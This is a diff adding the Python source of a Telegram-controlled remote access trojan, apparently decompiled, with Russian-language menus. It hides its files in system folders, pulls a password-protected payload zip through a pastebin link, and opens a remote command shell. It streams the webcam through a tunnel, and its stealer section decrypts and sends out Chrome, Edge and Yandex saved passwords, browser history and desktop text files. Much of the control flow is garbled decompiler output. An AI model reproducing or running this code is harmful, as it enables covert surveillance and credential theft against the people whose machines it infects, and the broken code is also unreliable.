@@ -1,0 +1,2320 @@
+global current_directory  # inserted
+global tunnel_process  # inserted
+global ffmpeg_process  # inserted
+import asyncio
+import asyncio.subprocess as aio_subprocess
+import base64
+import ctypes
+import datetime
+import getpass
+import json
+import logging
+import os
+import platform
+import re
+import shutil
+import sqlite3
+import subprocess
+import sys
+import tempfile
+import time
+import wave
+import zipfile
+import webbrowser
+from concurrent.futures import ThreadPoolExecutor
+import aiohttp
+import imageio
+import numpy as np
+import psutil
+import pyautogui
+import pyperclip
+import pyzipper
+import requests
+import sounddevice as sd
+import win32crypt
+import socket
+from aiogram import Bot, Dispatcher, F, types
+from aiogram.filters import Command
+from aiogram.fsm.context import FSMContext
+from aiogram.fsm.state import State, StatesGroup
+from aiogram.types import ContentType, FSInputFile, InlineKeyboardMarkup, InlineKeyboardButton, InlineKeyboardButton, ContentType, FSInputFile
+from comtypes import CLSCTX_ALL
+from cryptography.hazmat.backends import default_backend
+from cryptography.hazmat.primitives import padding
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.primitives.kdf.scrypt import Scrypt
+from Crypto.Cipher import AES
+from PIL import ImageGrab
+from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from ctypes import POINTER, cast
+
+def read_appended_data_vars(arg):
+    exe_path = sys.executable
+    with open(exe_path, 'rb') as file:
+        content = file.read()
+    marker = b'--MYDATA--\n'
+    if marker in content:
+        data = content.split(marker)[(-1)]
+        data_str = data.decode('utf-8')
+        namespace = {}
+        exec(data_str, {}, namespace)
+        if arg == 'api':
+            api = namespace.get('Api')
+            return api
+        if arg == 'user_id':
+            user_ids = namespace.get('user_id')
+            return user_ids
+API_TOKEN = read_appended_data_vars('api')
+ALLOWED_USER_ID = read_appended_data_vars('user_id')
+directory = 'C:/Users/Public/main'
+os.makedirs(directory, exist_ok=True)
+STATIC_DIR = 'C:\\ProgramData\\Windows App Certification Kit\\static'
+os.makedirs(STATIC_DIR, exist_ok=True)
+cloudflared_floader = 'C:\\ProgramData\\cloudflared'
+os.makedirs(cloudflared_floader, exist_ok=True)
+cloudflared_path = os.path.join(cloudflared_floader, 'cloudflared-windows-amd64.exe')
+ffmpeg_floader = 'C:\\ProgramData\\ffmpeg-7.1.1-essentials_build\\bin'
+os.makedirs(ffmpeg_floader, exist_ok=True)
+ffmpeg_path = os.path.join(ffmpeg_floader, 'ffmpeg.exe')
+flask_floader = 'C:\\Windows\\SysWOW64'
+flask_name = 'SysNetAgent.exe'
+os.makedirs(flask_floader, exist_ok=True)
+flask_path = os.path.join(flask_floader, flask_name)
+url = 'https://pastebin.com/raw/SeyVcXbn'
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher()
+MAX_MESSAGE_LENGTH = 4096
+a = np.random.randint(10000000, 99999999)
+START_TIME = datetime.datetime.now().timestamp()
+kb = [[types.KeyboardButton(text='Антивирус'), types.KeyboardButton(text='Скриншот')], [types.KeyboardButton(text='Процесы'), types.KeyboardButton(text='Фото с камеры')], [types.KeyboardButton(text='Полный отчет по процесам'), types.KeyboardButton(text='Завершить процесс')], [types.KeyboardButton(text='Создать папку'), types.KeyboardButton(text='Удалить папку')], [types.KeyboardButton(text='Содержание директории'), types.KeyboardButton(text='Переместиться по директории')], [types.KeyboardButton(text='Данные ПК'), types.KeyboardButton(text='Окно с вашим сообщением')], [types.KeyboardButton(text='Запись с веб камеры'), types.KeyboardButton(text='Запись аудио')], [types.KeyboardButton(text='Трансляция с веб камеры'), types.KeyboardButton(text='Остановить веб-трансляцию')], [types.KeyboardButton(text='Открыть файл'), types.KeyboardButton(text='Загрузить файл')], [types.KeyboardButton(text='Скачать файл'), types.KeyboardButton(
+
+@dp.message(Command('start'))
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
+        await message.answer('Готов к использованию', reply_markup=keyboard)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'назад')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
+        await message.answer('Возвращаюсь в главное меню', reply_markup=keyboard)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(F.text.lower() == 'стиллер')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        kb = [[types.KeyboardButton(text='Пароли хрома'), types.KeyboardButton(text='Пароли оперы GX'), types.KeyboardButton(text='Пароли яндекса'), types.KeyboardButton(text='Пароли edge')], [types.KeyboardButton(text='История хрома'), types.KeyboardButton(text='История оперы GX'), types.KeyboardButton(text='История яндекса'), types.KeyboardButton(text='История edge')], [types.KeyboardButton(text='Txt файлы с робочего стола')], [types.KeyboardButton(text='Назад')]]
+        keyboard = types.ReplyKeyboardMarkup(keyboard=kb, resize_keyboard=True)
+        await message.answer('Выберите функцию:', reply_markup=keyboard)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+ffmpeg_process = None
+tunnel_process = None
+
+async def kill_process_by_name(process_name):
+    try:
+        subprocess.run(['taskkill', '/IM', process_name, '/F'], check=True, **get_subprocess_kwargs())
+    except subprocess.CalledProcessError:
+        return
+
+async def free_port(start=1000, end=65535):
+    for port in range(start, end + 1):
+        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+            sock.settimeout(0.01)
+            result = sock.connect_ex(('127.0.0.1', port))
+            if result!= 0:
+                return port
+
+def get_subprocess_kwargs():
+    kwargs = {}
+    if sys.platform == 'win32':
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+        kwargs['startupinfo'] = startupinfo
+        kwargs['creationflags'] = subprocess.CREATE_NO_WINDOW
+    return kwargs
+
+async def run_ffmpeg():
+    global ffmpeg_process  # inserted
+
+    def get_devices(device_type):
+        command = [ffmpeg_path, '-list_devices', 'true', '-f', 'dshow', '-i', 'dummy']
+        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, **get_subprocess_kwargs())
+        devices = []
+        for line in result.stderr.splitlines():
+            if device_type in line:
+                devices.append(line.split('\"')[1])
+        return devices
+
+    def is_device_working(device_name, device_type):
+        if device_type == 'video':
+            cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'video={device_name}', '-t', '1', '-f', 'null', '-']
+        else:  # inserted
+            cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'audio={device_name}', '-t', '1', '-f', 'null', '-']
+        res = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, **get_subprocess_kwargs())
+        return res.returncode == 0
+    video_dev = next((d for d in get_devices('video') if is_device_working(d, 'video')), None)
+    audio_dev = next((d for d in get_devices('audio') if is_device_working(d, 'audio')), None)
+    if not video_dev or not audio_dev:
+        print('Нет доступных видео- или аудиоустройств.')
+        return
+    if ffmpeg_process and ffmpeg_process.returncode is None:
+        return
+    cmd = [ffmpeg_path, '-f', 'dshow', '-i', f'video={video_dev}:audio={audio_dev}', '-vcodec', 'libx264', '-preset', 'ultrafast', '-tune', 'zerolatency', '-acodec', 'aac', '-ar', '44100', '-ac', '2', '-b:v', '800k', '-b:a', '128k', '-f', 'hls', '-hls_time', '2', '-hls_list_size', '5', '-hls_flags', 'delete_segments+append_list+omit_endlist', '-hls_allow_cache', '0', os.path.join(STATIC_DIR, 'stream.m3u8')]
+    creationflags = 0
+    startupinfo = None
+    if sys.platform == 'win32':
+        creationflags = subprocess.CREATE_NO_WINDOW
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    ffmpeg_process = await aio_subprocess.create_subprocess_exec(*cmd, stdout=aio_subprocess.PIPE, stderr=aio_subprocess.STDOUT, creationflags=creationflags, startupinfo=startupinfo)
+
+async def run_tunnel(chat_id, bot_instance, port):
+    global tunnel_process  # inserted
+    creationflags = 0
+    startupinfo = None
+    if sys.platform == 'win32':
+        creationflags = subprocess.CREATE_NO_WINDOW
+        startupinfo = subprocess.STARTUPINFO()
+        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
+    tunnel_process = await asyncio.create_subprocess_exec(cloudflared_path, 'tunnel', '--url', f'http://localhost:{port}', stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.STDOUT, creationflags=creationflags, startupinfo=startupinfo)
+    pattern = re.compile('(https?://[^\\s]+trycloudflare\\.com\\S*)')
+    pass
+@dp.message(F.text.lower() == 'трансляция с веб камеры')
+async def start_stream(message: types.Message):
+    if getattr(start_stream, 'is_running', False):
+        return await message.answer('Трансляция уже запущена!')
+    else:  # inserted
+        if os.path.isfile(ffmpeg_path) and os.path.isfile(cloudflared_path) and os.path.isfile(flask_path):
+            break
+        dan = await message.answer('Подгрузка файлов для работы трансляции...')
+        response = requests.get(url)
+        if response.status_code == 200:
+            data = json.loads(response.text)
+            link_sourse = data['sources']
+            print(link_sourse)
+        else:  # inserted
+            link_sourse = 'none'
+        cloudflared_name = 'cloudflared-windows-amd64.exe'
+        ffmpeg_name = 'ffmpeg.exe'
+        await kill_process_by_name(cloudflared_name)
+        await kill_process_by_name(ffmpeg_name)
+        await kill_process_by_name(flask_name)
+        await asyncio.sleep(5)
+        zip_path = os.path.join(directory, 'sourse.zip')
+        response = requests.get(link_sourse)
+        if response.status_code == 200:
+            with open(zip_path, 'wb') as f:
+                f.write(response.content)
+            cloudflared_name = 'cloudflared-windows-amd64.exe'
+            ffmpeg_name = 'ffmpeg.exe'
+            password = 'BatRat'
+            with pyzipper.AESZipFile(zip_path) as zf:
+                zf.pwd = password.encode()
+                with zf.open(cloudflared_name) as src:
+                    with open(os.path.join(cloudflared_floader, os.path.basename(cloudflared_name)), 'wb') as dst:
+                        dst.write(src.read())
+                with zf.open(ffmpeg_name) as src:
+                    with open(os.path.join(ffmpeg_floader, os.path.basename(ffmpeg_name)), 'wb') as dst:
+                        dst.write(src.read())
+                with zf.open(flask_name) as src:
+                    with open(os.path.join(flask_floader, os.path.basename(flask_name)), 'wb') as dst:
+                        dst.write(src.read())
+            if os.path.exists(zip_path):
+                os.remove(zip_path)
+            await dan.edit_text('Файлы успешно загружены! ✅')
+        else:  # inserted
+            await message.answer('Ошибка при скачивании, поробуйте позже ❌')
+        cloudflared_name = 'cloudflared-windows-amd64.exe'
+        ffmpeg_name = 'ffmpeg.exe'
+        await kill_process_by_name(cloudflared_name)
+        await kill_process_by_name(ffmpeg_name)
+        await kill_process_by_name(flask_name)
+        await asyncio.sleep(1)
+        try:
+            msg = await message.answer('Проверка камеры 📹')
+        except Exception:
+                reader = imageio.get_reader('<video0>')
+                _ = reader.get_next_data()
+                reader._close()
+            else:  # inserted
+                await msg.edit_text('Запуск трансляции 🔴')
+        return await message.answer('Камера отсутствует или занята другим процессом.')
+
+@dp.message(F.text.lower() == 'остановить веб-трансляцию')
+async def stop_stream(message: types.Message):
+    if not getattr(start_stream, 'is_running', False):
+        return await message.answer('Трансляция не запущена.')
+    else:  # inserted
+        start_stream.is_running = False
+        for task in start_stream.tasks:
+            if not task.done():
+                task.cancel()
+                try:
+                    await task
+                except asyncio.CancelledError:
+                    pass  # postinserted
+        else:  # inserted
+            if ffmpeg_process and ffmpeg_process.returncode is None:
+                ffmpeg_process.terminate()
+            if tunnel_process and tunnel_process.returncode is None:
+                tunnel_process.terminate()
+            await kill_process_by_name(flask_name)
+        for file in os.listdir(STATIC_DIR):
+            if file.endswith('.ts') or file.endswith('.m3u8'):
+                os.remove(os.path.join(STATIC_DIR, file))
+        await message.answer('Трансляция остановлена.')
+        pass
+
+async def send_text_in_parts(message: types.Message, text: str):
+    parts = [text[i:i + MAX_MESSAGE_LENGTH] for i in range(0, len(text), MAX_MESSAGE_LENGTH)] for part in parts if await message.reply(f'`{part}`', parse_mode='Markdown') == https://pastebin.com/raw/SeyVcXbn
+active_sessions = {}
+
+@dp.message(F.text.lower() == 'команды в cmd')
+async def start_cmd(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        user_id = message.from_user.id
+        active_sessions[user_id] = True
+        await message.reply('Вы вошли в режим CMD. Введите команду или напишите \'стоп\', чтобы выйти из режима.')
+
+@dp.message(lambda message: message.from_user.id in active_sessions)
+async def handle_cmd_command(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        user_id = message.from_user.id
+        if active_sessions.get(user_id):
+            if message.text.lower() == 'стоп':
+                active_sessions.pop(user_id, None)
+                await message.reply('Вы вышли из режима CMD.')
+                return
+            else:  # inserted
+                command = message.text
+                try:
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True, encoding='utf-8')
+                    output = result.stdout.strip() or result.stderr.strip() or 'Команда выполнена успешно, но без вывода.'
+                    await send_text_in_parts(message, output)
+                except Exception as e:
+                    pass  # postinserted
+        await message.reply(f'Ошибка при выполнении команды: {e}')
+
+class WaitingForInput(StatesGroup):
+    user_box_message = State()
+    waiting_for_download_folder_path = State()
+    waiting_for_pid = State()
+    waiting_for_new_folder_path = State()
+    waiting_for_folder_delete_path = State()
+    waiting_for_download_file_path = State()
+    waiting_for_file_delete_path = State()
+    waiting_for_directory_path = State()
+    waiting_for_screen_recording_duration = State()
+    waiting_for_webcam_recording_duration = State()
+    waiting_for_file_open_path = State()
+    waiting_for_clipboard_change = State()
+    waiting_for_url_open = State()
+    waiting_for_file_encryption_path = State()
+    waiting_for_file_decryption_path = State()
+    waiting_for_cmd_window_count = State()
+    waiting_for_wallpaper_image = State()
+    waiting_for_self_destruction_code = State()
+    waiting_for_file_move_source_path = State()
+    waiting_for_file_move_destination_path = State()
+    waiting_for_audio_recording_duration = State()
+    waiting_for_file_upload_destination_path = State()
+    waiting_for_file_upload = State()
+
+@dp.message(F.text.lower() == 'окно с вашим сообщением')
+async def give_maessage(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Введите текст для сообщения\\:*', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.user_box_message)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.user_box_message)
+async def maessage(message: types.Message, state: FSMContext):
+    src_folder = message.text
+    powershell_script = f'\n$wshell = New-Object -ComObject WScript.Shell\n$wshell.Popup(\'{src_folder}\', 0, \'Сообщение\', 0x40 + 0x40000)  # 0x40 - иконка информации, 0x40000 - поверх всех окон\n    '
+    try:
+        subprocess.Popen(['powershell', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-Command', powershell_script], creationflags=subprocess.CREATE_NO_WINDOW)
+        await asyncio.sleep(1.2)
+    except:
+        pass  # postinserted
+    await message.answer('*Ошибка при обработке команды* ❌', parse_mode='MarkdownV2')
+            await message.answer('*Сообщение отправлено* 💬', parse_mode='MarkdownV2')
+    await state.clear()
+
+@dp.message(F.text.lower() == 'скачать папку')
+async def Path_floader(message: types.Message, state: FSMContext):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        await message.answer('*Укажите путь и вконце название папки\\, пример:*\n \'C:/Users/Public/Название\\_папки\'', parse_mode='MarkdownV2')
+        await state.set_state(WaitingForInput.waiting_for_download_folder_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+
+@dp.message(WaitingForInput.waiting_for_download_folder_path)
+async def Dowloand_floader(message: types.Message, state: FSMContext):
+    src_folder = message.text
+    if os.path.isdir(src_folder):
+        total_size = sum((os.path.getsize(os.path.join(root, file)) for root, _, files in os.walk(src_folder) for file in files))
+        size_mb = total_size / 1048576
+    else:  # inserted
+        await message.answer('Папка не найдена')
+        await state.clear()
+        archive_path = os.path.join(directory, 'folder_backup.zip')
+        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
+            for root, _, files in os.walk(src_folder):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    arcname = os.path.relpath(file_path, src_folder)
+                    archive.write(file_path, arcname)
+        size_mb = os.path.getsize(archive_path) / 1048576
+        if size_mb > 50:
+            await message.answer('Размер папки превышает 50 мегабайт. Пожалуйста, укажите другой путь.')
+            os.remove(archive_path)
+            await state.clear()
+        else:  # inserted
+            if False:
+                pass  # postinserted
+            await message.answer_document(document=FSInputFile(archive_path), caption='📂 Папка')
+            os.remove(archive_path)
+            await state.clear()
+
+@dp.message(F.text.lower() == 'история яндекса')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_yandex_history():
+            local_path = os.getenv('LOCALAPPDATA')
+            yandex_path = os.path.join(local_path, 'Yandex', 'YandexBrowser', 'User Data')
+            if not os.path.exists(yandex_path):
+                return (False, 'Яндекс.Браузер не найден.')
+            text_to_save = ''
+            for profile in os.listdir(yandex_path):
+                profile_path = os.path.join(yandex_path, profile)
+                if os.path.isdir(profile_path) and 'History' in os.listdir(profile_path):
+                    history_path = os.path.join(profile_path, 'History')
+                    temp_history_path = os.path.join(directory, 'temp_history')
+                    shutil.copy2(history_path, temp_history_path)
+                    try:
+                        conn = sqlite3.connect(temp_history_path)
+                        cursor = conn.cursor()
+                        query = '\n                        SELECT urls.url, urls.title, urls.last_visit_time\n                        FROM urls\n                        ORDER BY last_visit_time DESC\n                        '
+                        cursor.execute(query)
+                        rows = cursor.fetchall()
+                        text_to_save += f'--- История профиля: {profile} ---\n'
+                        for row in rows:
+                            url = row[0]
+                            title = row[1]
+                            last_visit_time = row[2]
+                except Exception as e:
+                        else:  # inserted
+                            try:
+                                if last_visit_time > 0:
+                                    last_visit_time = last_visit_time / 1000000 - 11644473600
+                                    last_visit_time = datetime.datetime.fromtimestamp(last_visit_time).strftime('%Y-%m-%d %H:%M:%S')
+                                else:  # inserted
+                                    last_visit_time = 'Invalid time'
+                            except (OSError, ValueError) as e:
+                                pass  # postinserted
+                            else:  # inserted
+                                text_to_save += f'URL: {url}\nTitle: {title}\nLast Visit: {last_visit_time}\n\n'
+                        else:  # inserted
+                            conn.close()
+                        else:  # inserted
+                            os.remove(temp_history_path)
+            else:  # inserted
+                if not text_to_save:
+                    return (False, 'Яндекс не установлен.')
+                file_path = os.path.join(directory, '📂 История_Яндекс.Браузера.txt')
+                with open(file_path, 'w', encoding='utf-8') as file:
+                    file.write(text_to_save)
+                    return (True, file_path)
+                last_visit_time = f'Error: {str(e)}'
+                text_to_save += f'Ошибка при чтении истории профиля {profile}: {e}\n\n'
+        await message.answer('Получение истории Яндекс.Браузера. Пожалуйста, подождите...')
+        success, result = get_yandex_history()
+        if not success:
+            await message.answer(result)
+            return
+        else:  # inserted
+            file_path = result
+            try:
+                file_to_send = FSInputFile(file_path)
+                await message.answer_document(document=file_to_send, caption='Вот ваш файл с историей!')
+            except Exception as e:
+                    if os.path.exists(file_path):
+                        os.remove(file_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'Ошибка при отправке файла: {e}')
+
+@dp.message(F.text.lower() == 'пароли яндекса')
+async def yandex_passwords(message: types.Message):
+    LOCAL_STATE_PATH = os.path.expandvars('%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Local State')
+    DB_PATH = os.path.expandvars('%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data')
+    Yandex_path = os.path.join(os.getcwd(), 'Yandex.txt')
+
+    def get_encryption_key():
+        try:
+            with open(LOCAL_STATE_PATH, 'r', encoding='utf-8') as f:
+                pass  # postinserted
+        except Exception as e:
+                local_state = json.load(f)
+                    encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                    encrypted_key = encrypted_key[5:]
+                    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                return None
+            else:  # inserted
+                pass
+
+    def decrypt_password(encrypted_value, key):
+        try:
+            if encrypted_value.startswith(b'\xd0b'):
+                encrypted_value = encrypted_value[2:]
+            if len(encrypted_value) < 28:
+                return 'Ошибка: данные слишком короткие'
+            iv = encrypted_value[:12]
+            ciphertext = encrypted_value[12:(-16)]
+            tag = encrypted_value[(-16):]
+            cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+            decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+            return decrypted.decode('utf-8', errors='replace')
+        except ValueError:
+            return 'Ошибка: MAC check failed'
+        except Exception as e:
+            return f'Ошибка: {str(e)}'
+
+    async def get_saved_passwords():
+        try:
+            key = get_encryption_key()
+            if not key:
+                pass  # postinserted
+        except Exception as e:
+            else:  # inserted
+                try:
+                    pass  # postinserted
+                conn.close()
+            conn = sqlite3.connect(DB_PATH)
+            conn.text_factory = bytes
+            cursor = conn.cursor()
+            cursor.execute('\n                SELECT action_url, username_value, password_value \n                FROM logins \n                WHERE password_value IS NOT NULL\n            ')
+            with open(Yandex_path, 'w', encoding='utf-8') as f:
+                for row in cursor.fetchall():
+                    try:
+                        url, user, pwd = row
+                        if not user or not url:
+                            continue
+                        decrypted = decrypt_password(pwd, key)
+                        decoded_url = url.decode('utf-8', errors='replace') if url else ''
+                        decoded_user = user.decode('utf-8', errors='replace') if user else ''
+                        f.write(f'URL: {decoded_url}\n')
+                        f.write(f'User: {decoded_user}\n')
+                        f.write(f'Password: {decrypted}\n')
+                        f.write('==================================================\n')
+                    except Exception as e:
+                        pass  # postinserted
+                else:  # inserted
+                    try:
+                        pass  # postinserted
+                    conn.close()
+                    return True
+                    f.write(f'Ошибка обработки записи: {str(e)}\n')
+                    f.write('==================================================\n')
+                return False
+    if await get_saved_passwords():
+        try:
+            await message.answer_document(document=FSInputFile(Yandex_path), caption='📂 История паролей Яндекс')
+        except Exception as e:
+            pass  # postinserted
+    else:  # inserted
+        await message.answer('Ошибка при доступе к базе данных паролей')
+        await message.answer(f'❌ Ошибка отправки: {str(e)}')
+
+@dp.message(F.text.lower() == 'пароли edge')
+async def edge_passwords(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_edge_path():
+            local_path = os.getenv('LOCALAPPDATA')
+            edge_path = os.path.join(local_path, 'Microsoft', 'Edge', 'User Data')
+            return edge_path if os.path.exists(edge_path) else None
+
+        def get_master_key():
+            try:
+                edge_path = get_edge_path()
+                with open(os.path.join(edge_path, 'Local State'), 'r') as f:
+                    pass  # postinserted
+            except Exception as e:
+                    local_state = json.loads(f.read())
+                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
+                        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                    logging.error(f'Edge key error: {e}')
+                else:  # inserted
+                    pass
+
+        def decrypt_edge_password(encrypted, key):
+            try:
+                iv, payload = (encrypted[3:15], encrypted[15:(-16)])
+                cipher = AES.new(key, AES.MODE_GCM, iv)
+                return cipher.decrypt(payload).decode()
+            except:
+                return 'Decryption failed'
+
+        def extract_edge_credentials():
+            master_key = get_master_key()
+            if not master_key:
+                return 'Key extraction error'
+            profiles = [d for d in os.listdir(get_edge_path()) if d.startswith('Profile') or d == 'Default']
+            credentials = []
+            for profile in profiles:
+                try:
+                    login_db = os.path.join(get_edge_path(), profile, 'Login Data')
+                    with tempfile.NamedTemporaryFile(delete=False) as tmp:
+                        pass  # postinserted
+                except Exception as e:
+                        shutil.copy2(login_db, tmp.name)
+                        conn = sqlite3.connect(tmp.name)
+                        cursor = conn.cursor()
+                        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+                        for url, user, passw in cursor.fetchall():
+                            decrypted = decrypt_edge_password(passw, master_key)
+                            if decrypted:
+                                credentials.append(f"URL: {url}\nЛогин: {user}\nПароль: {decrypted}\n{'──────────────────────────────'}")
+                logging.error(f'Profile {profile} error: {e}')
+        edge_data = extract_edge_credentials()
+        filename = os.path.join(directory, 'edge_data.txt')
+        with open(filename, 'w', encoding='utf-8') as f:
+            f.write(edge_data)
+        try:
+            await message.answer_document(document=FSInputFile(filename), caption='🔑 Вот ваши пароли из Edge')
+        except Exception as e:
+                os.remove(filename)
+    else:  # inserted
+        await message.answer('🚫 Access denied')
+        await message.answer(f'Error: {str(e)}')
+        if os.path.exists(filename):
+            os.remove(filename)
+
+@dp.message(F.text.lower() == 'история edge')
+async def edge_history_handler(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id not in ALLOWED_USER_ID:
+        return await message.answer('🚫 Доступ запрещен')
+    else:  # inserted
+        await message.answer('⌛ Загружаю историю Edge...')
+
+        def extract_edge_history():
+            history_path = os.path.expandvars('%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\\History')
+            temp_copy = os.path.join(directory, 'edge_history_temp')
+            if not os.path.exists(history_path):
+                return (False, '❌ Файл истории Edge не найден')
+            try:
+                shutil.copy2(history_path, temp_copy)
+                with sqlite3.connect(temp_copy) as conn:
+                    pass  # postinserted
+            except Exception as e:
+                    cursor = conn.cursor()
+                    cursor.execute('\n                    SELECT \n                        url, \n                        title, \n                        last_visit_time \n                    FROM urls \n                    ORDER BY last_visit_time DESC \n                    LIMIT 1000\n                ')
+                    history_data = []
+                    for url, title, timestamp in cursor.fetchall():
+                        win_epoch = datetime.datetime(1601, 1, 1)
+                        delta = datetime.timedelta(microseconds=timestamp)
+                        visit_time = (win_epoch + delta).strftime('%d.%m.%Y %H:%M:%S')
+                        history_data.append(f"🌐 {url}\n📌 {(title[:75] + '...' if len(title) > 75 else title)}\n🕒 {visit_time}\n{'────────────────────────────────────────'}")
+                    if not history_data:
+                        return
+                    else:  # inserted
+                        try:
+                            if conn:
+                                conn.close()
+                        except:
+                            pass
+                    else:  # inserted
+                        if os.path.exists(temp_copy):
+                            os.remove(temp_copy)
+                            return (False, '📭 История браузера пуста')
+                        return (False, '📭 История браузера пуста')
+                    else:  # inserted
+                        output_file = os.path.join(directory, 'Edge_History.txt')
+                        with open(output_file, 'w', encoding='utf-8') as f:
+                            f.write('\n\n'.join(history_data))
+                        return (True, output_file)
+                    else:  # inserted
+                        try:
+                            if conn:
+                                conn.close()
+                        except:
+                            pass
+                    else:  # inserted
+                        if os.path.exists(temp_copy):
+                            os.remove(temp_copy)
+                    logging.error(f'Edge history error: {str(e)}')
+                    return (False, f'⚠️ Ошибка: {str(e)}')
+        status, result = extract_edge_history()
+        if status:
+            try:
+                await message.answer_document(document=FSInputFile(result), caption='📂 История Microsoft Edge')
+            except Exception as e:
+                pass  # postinserted
+        else:  # inserted
+            await message.answer(result)
+            await message.answer(f'❌ Ошибка отправки: {str(e)}')
+
+@dp.message(F.text.lower() == 'txt файлы с робочего стола')
+async def zip_txt_files(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        src_folder = os.path.join(os.path.expanduser('~'), 'Desktop')
+        archive_path = os.path.join(directory, 'txt.zip')
+        with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as archive:
+            for file in os.listdir(src_folder):
+                if file.endswith('.txt'):
+                    file_path = os.path.join(src_folder, file)
+                    archive.write(file_path, os.path.basename(file_path))
+        try:
+            await message.answer_document(document=FSInputFile(archive_path), caption='📂 Txt файлы')
+        except Exception as e:
+                os.remove(archive_path)
+    else:  # inserted
+        await message.answer('К сожалению, у вас нет доступа к этому боту.')
+        await message.answer(f'❌ Ошибка отправки: {str(e)}')
+
+@dp.message(F.text.lower() == 'пароли хрома')
+async def cmd_start(message: types.Message):
+    if message.date.timestamp() < START_TIME:
+        return
+    if message.from_user.id in ALLOWED_USER_ID:
+        def get_chrome_path():
+            local_path = os.getenv('LOCALAPPDATA')
+            chrome_path = os.path.join(local_path, 'Google', 'Chrome', 'User Data')
+            if os.path.exists(chrome_path):
+                return chrome_path
+            return None
+
+        def get_master_key():
+            chrome_path = get_chrome_path()
+            if not chrome_path:
+                return
+            try:
+                with open(os.path.join(chrome_path, 'Local State'), 'r') as file:
+                    pass  # postinserted
+            except Exception as e:
+                    local_state = file.read()
+                    local_state = json.loads(local_state)
+                        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
+                        encrypted_key = encrypted_key[5:]
+                        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+                        return master_key
+                    logging.error(f'Ошибка при получении ключа: {e}')
+                    return None
+
+        def decrypt_password(buff, master_key):
+            try:
+                iv = buff[3:15]
+                payload = buff[15:]
+                cipher = AES.new(master_key, AES.MODE_GCM, iv)
+                decrypted_pass = cipher.decrypt(payload)[:(-16)].decode()
+                return decrypted_pass
+            except Exception as e:
+                logging.error(f'Ошибка при расшифровке пароля: {e}')
+                return None
+            else:  # inserted
+                pass
+
+        def get_chrome_passwords():
+            chrome_path = get_chrome_path()
+            if not chrome_path:
+                return 'Google Chrome не найден.'
+            profiles = [profile for profile in os.listdir(chrome_path) if profile.startswith('Profile') or profile == 'Default']
+            all_passwords = []
+            master_key = get_master_key()
+            if not master_key:
+                return 'Не удалось получить ключ шифрования.'
+            for profile in profiles:
+                try:
+                    db_path = os.path.join(chrome_path, profile, 'Login Data')
+                    if not os.path.exists(db_path):
+                        continue
+                    temp_db = tempfile.NamedTemporaryFile(delete=False)
